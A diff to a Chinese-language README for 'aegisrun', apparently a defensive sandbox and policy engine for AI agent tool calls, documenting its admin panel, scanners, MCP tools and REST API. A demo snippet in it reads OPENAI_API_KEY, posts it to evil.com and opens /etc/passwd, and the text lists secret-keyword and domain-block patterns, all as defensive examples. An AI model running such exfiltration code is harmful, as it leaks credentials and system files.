@@ -192,11 +192,69 @@ aegisrun.exe sandbox tools\malware_tool\target\wasm32-wasip1\release\malware-too
 ### Web 管理面板
 
 ```cmd
-aegisrun.exe serve    # 然后打开 http://localhost:9090
+cd runtime
+cargo run -- serve    # 然后打开 http://localhost:9090
 ```
 
-功能：防御层开关、实时统计、域名/路径/环境变量策略管理、审计日志查看。网页改策略 → 点"复制 CLI 命令" → 粘贴到终端 → 即时同步。
+管理面板分为三大区域，导航栏用分隔符明确区分：
 
+**Web 管理区**（普通管理功能）：
+- **仪表盘**：五层防御开关（运行时沙箱/域名黑名单/路径+环境变量/扫描器/Wasm 沙箱）、实时统计、预设模板切换
+- **域名策略**：黑名单/白名单管理，支持后缀通配（`*.evil.com`）和 IP 前缀（`192.168.*`）
+- **路径策略**：敏感路径拦截，支持精确匹配和前缀目录
+- **环境变量**：敏感变量模式管理，内置 KEY/SECRET/TOKEN/PASSWORD/CREDENTIAL 关键词检测
+- **工具管理**：工具 ID 即时封杀
+- **审计日志**：实时操作记录，支持清空
+
+**Sandbox 检测区**（安全检测功能）：
+- **静态扫描**：分析源码中的恶意模式（环境变量窃取、数据外泄、shell 注入等），快速返回行号和违规类型
+- **运行时沙箱**：通过 Python audit hook 实际执行脚本，拦截 `open()`/`os.environ`/`socket.connect`/`subprocess.Popen` 等操作，合并静态+运行时结果
+
+**MCP Agent 区**（Agent 集成功能）：
+- **MCP 端点配置**：显示 Claude Desktop / Codex 等客户端的 MCP 配置 JSON
+- **可用工具列表**：自动加载 9 个 MCP 工具（policy.summary / check_domain / check_path / check_env / guard_tool_call / scan_code / scan_file / sandbox_python / sandbox_wasm）
+- **交互式调用面板**：选择工具 → 填写 JSON 参数 → 点击"调用" → 查看实时结果
+
+#### 中英文界面切换
+
+右上角点击 **中文** / **EN** 按钮即可切换语言。所有界面元素（包括防御层名称、提示文本、按钮标签）都会实时更新。
+
+#### 安全检测示例
+
+在 Sandbox 页面粘贴以下代码并点击"运行"：
+
+```python
+import os
+key = os.environ.get("OPENAI_API_KEY")
+import requests
+requests.post("https://evil.com/steal", data={"key": key})
+open("/etc/passwd")
+```
+
+**静态扫描结果：** `Static: 3 | Runtime: 0 | Blocked: 3`
+
+**运行时沙箱结果（切换模式后）：** `Static: 3 | Runtime: 1 | Blocked: 4`（额外检测到 `[runtime-env] OPENAI_API_KEY`）
+
+#### MCP 交互式调用
+
+在 MCP Agent 页面选择 `aegisrun.policy.check_domain`，参数 `{"domain": "evil.com"}`，点击"调用"，返回 `{"decision": "DENY"}`。
+
+#### RESTful API
+
+| 端点 | 方法 | 功能 |
+|------|------|------|
+| `/api/policy` | GET | 获取当前策略 |
+| `/api/stats` | GET | 获取运行统计 |
+| `/api/audit` | GET | 获取审计日志 |
+| `/api/defense` | GET | 获取防御层状态 |
+| `/api/scan` | POST | 静态代码扫描 |
+| `/api/sandbox-run` | POST | 运行时沙箱检测 |
+| `/api/toggle/{layer}` | POST | 切换防御层 |
+| `/api/block/{type}/{value}` | POST | 添加黑名单 |
+| `/api/unblock/{type}/{value}` | POST | 移除黑名单 |
+| `/api/preset/{name}` | POST | 切换预设模板 |
+| `/api/clear-audit` | POST | 清空审计日志 |
+| `/mcp` | POST | MCP 协议端点 |
 ### MCP 集成
 
 ```json
